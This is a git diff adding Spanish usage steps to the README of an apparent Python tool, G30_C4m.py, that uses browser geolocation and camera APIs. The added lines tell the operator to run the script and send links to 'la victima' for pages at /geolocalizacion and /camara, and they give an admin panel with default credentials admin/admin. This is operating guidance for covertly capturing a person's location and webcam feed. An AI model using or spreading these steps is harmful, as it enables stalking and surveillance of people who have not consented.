@@ -12,11 +12,28 @@ Con la ayuda de APIs del navegador (como navigator.geolocation y navigator.media
 
 - Instalar Requerimientos:
   pip install -r requirements.txt
+  
+- Como Activar:
+python G30_C4m.py
+
+- Enviar el link a la victima:
+http://ip:5000/geolocalizacion
+http://ip:5000/camara
+
+-Panel de administracion:
+http://ip:5000
+contraseña:
+admin/admin
+
 
   ![image](https://github.com/user-attachments/assets/89c5b135-9ba0-4db5-a482-a9666aecbc88)
   ![image](https://github.com/user-attachments/assets/71c4c345-b426-453d-b9e1-9ddb15c6d5ff)
 ![image](https://github.com/user-attachments/assets/9a052b01-4c80-4ce9-aa0c-90469b6df576)
 ![image](https://github.com/user-attachments/assets/1fc42092-dfa3-4b4d-a480-109ac44f913b)
+![image](https://github.com/user-attachments/assets/48e820ad-791e-4569-bdea-0e8310e12055)
+
+
+
 
 
 
